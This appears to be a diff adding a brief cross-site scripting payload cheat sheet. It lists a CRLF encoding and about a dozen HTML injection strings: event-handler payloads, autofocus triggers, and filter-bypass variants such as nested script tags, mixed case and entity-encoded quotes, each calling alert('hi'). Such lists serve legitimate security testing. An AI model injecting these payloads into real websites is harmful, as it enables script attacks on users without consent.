@@ -1,0 +1,17 @@
+XSS
+
+CRLF %0D%0A
+
+
+<a onmouseover=alert('hi')>Hover over me</a>
+<img src=x onerror=alert('hi')>
+<svg onload=alert('hi')>
+<scr<script>ipt>alert('hi')</scr<script>ipt> 
+<img/src="x"/onerror=alert('hi')>
+<button onclick="alert('hi')">Click Me</button>
+<button onmouseover="alert('hi')">Hover Me</button>
+<button onfocus="alert('hi')">Click to Focus</button>
+<button onfocus="alert('hi')" autofocus>
+<BuTtOn OnClIcK="alert('hi')">Click</BuTtOn>
+<button/onclick=alert('hi')>Click</button>
+<button onclick="alert(&apos;hi&apos;)">Click</button> [HTML bypass]
